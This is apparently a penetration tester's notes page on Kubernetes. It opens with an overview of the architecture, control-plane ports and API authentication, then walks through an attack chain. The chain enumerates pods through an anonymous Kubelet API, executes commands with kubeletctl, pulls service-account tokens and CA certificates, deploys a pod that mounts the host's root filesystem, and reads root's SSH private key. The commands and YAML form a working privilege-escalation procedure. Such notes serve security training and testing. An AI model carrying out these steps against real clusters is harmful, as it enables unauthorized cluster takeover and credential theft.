# Kubernetes

{% hint style="info" %}
* [Kubernetes](https://kubernetes.io/), also known as `K8s`, stands out as a revolutionary technology that has had a significant impact on the software development landscape. This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.
* One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications. As a result, Kubernetes has become a go-to solution for organizations looking to streamline their development processes and improve efficiency.
* Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through `multiple layers of protection`. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches. The K8s architecture comprises a `master node` and `worker nodes`, each with specific roles.
{% endhint %}

## K8s Concept <a href="#k8s-concept" id="k8s-concept"></a>

* Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers.
* Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details.
* Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more.
* Despite challenges in security and management, K8s continues to grow and improve with features like `Role-Based Access Control` (`RBAC`), `Network Policies`, and `Security Contexts`, providing a safer environment for applications.

<details>

<summary><strong>Docker vs Kubernetes</strong></summary>

<table data-header-hidden><thead><tr><th width="127.00006103515625">Function</th><th width="236.4285888671875">Docker</th><th>Kubernetes</th></tr></thead><tbody><tr><td><code>Primary</code></td><td>Platform for containerizing Apps</td><td>An orchestration tool for managing containers</td></tr><tr><td><code>Scaling</code></td><td>Manual scaling with Docker swarm</td><td>Automatic scaling</td></tr><tr><td><code>Networking</code></td><td>Single network</td><td>Complex network with policies</td></tr><tr><td><code>Storage</code></td><td>Volumes</td><td>Wide range of storage options</td></tr></tbody></table>

</details>

* Kubernetes architecture is primarily divided into two types of components:
  * `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
  * `The Worker Nodes` (minions), where the containerized applications are run

### Control Plane

* | `etcd`                  | `2379`, `2380` |
  | ----------------------- | -------------- |
  | `API server`            | `6443`         |
  | `Scheduler`             | `10251`        |
  | `Controller Manager`    | `10252`        |
  | `Kubelet API`           | `10250`        |
  | `Read-Only Kubelet API` | `10255`        |
* The `Scheduler`, based on the `API server`, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the `etcd`.
* The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.

### Nodes

* The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained.&#x20;
* On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.

### Minions

* Within a containerized environment, the `Minions` (worker nodes) serve as the designated location for running applications.
* It's important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.

## K8's Security Measures

* Kubernetes security can be divided into several domains:
  * Cluster infrastructure security
  * Cluster configuration security
  * Application security
  * Data security

## Kubernetes API <a href="#kubernetes-api" id="kubernetes-api"></a>

* The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions. The Kubernetes API has been designed to support declarative control, allowing users to define their desired state for the system.
* The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system's state. These requests can involve creating, modifying, deleting, and retrieving information related to various resources within the system.
* Within the Kubernetes framework, an API resource serves as an endpoint that houses a specific collection of API objects. These objects pertain to a particular category and include essential elements such as Pods, Services, and Deployments, among others.
* <table data-header-hidden><thead><tr><th width="104.57147216796875">Request</th><th>Description</th></tr></thead><tbody><tr><td><code>GET</code></td><td>Retrieves information about a resource or a list of resources.</td></tr><tr><td><code>POST</code></td><td>Creates a new resource.</td></tr><tr><td><code>PUT</code></td><td>Updates an existing resource.</td></tr><tr><td><code>PATCH</code></td><td>Applies partial updates to a resource.</td></tr><tr><td><code>DELETE</code></td><td>Removes a resource.</td></tr></tbody></table>

### Authentication

* Supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity.
* Kubernetes enforces authorization decisions using Role-Based Access Control (`RBAC`) that involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources.
* **Anonymous Access**
  * The `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access.
  * Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous.

### K8's API Server Interaction

* `curl https://<API-Server-IP>:6443 -k`&#x20;
* `System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously.
* By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request

### Kubelet API - Extracting Pods

* `curl https://<API-Server-IP>:10250/pods -k | jq .`&#x20;
* The information displayed includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods.
* Understanding the container images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them to gain unauthorized access to the system.
* Namespace information can provide insights into how the pods and resources are arranged within the cluster, which we can use to target specific namespaces with known vulnerabilities.
* Use metadata such as `uid` and `resourceVersion` to perform reconnaissance and recognize potential targets for further attacks.&#x20;
* Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.

### Kubeletctl - Extracting Pods

* `kubeletctl -i --server <API-Server-IP> pods`

### Kubelet API - Available Commands

* `kubeletctl -i --server <API-Server-IP> scan rce`

### Kubelet API - Executing Commands

* `kubeletctl -i --server <API-Server-IP> exec "id" -p <pod-name> -c <container-name>`

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

* Utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server.
* To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

### Kubelet API - Extracting Tokens

* `kubeletctl -i --server <API-Server-IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p <pod-name> -c <container-name> | tee -a k8.token`

### Kubelet API - Extracting Certificates

* `kubeletctl --server <API-Server-IP> exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p <pod-name> -c <container-name> | tee -a ca.crt`&#x20;

### List Privileges

* `` export token=`cat k8.token` ``&#x20;
* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 auth can-i --list`

### Pod YAML

* We can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory.

<details>

<summary>YAML Config - PrivEsc.yaml</summary>

{% code lineNumbers="true" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: <existing-image-name-with-version-obtained-from-above-enumeration>
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
{% endcode %}

</details>

### Create new Pod

* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 apply -f privesc.yaml`&#x20;
* `kubectl --token=$token --certificate-authority=ca.crt --server=https://<API-Server-IP>:6443 get pods`&#x20;

### Extracting Root's SSH Key

* We can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.
* `kubeletctl --server <API-Server-IP> exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc`
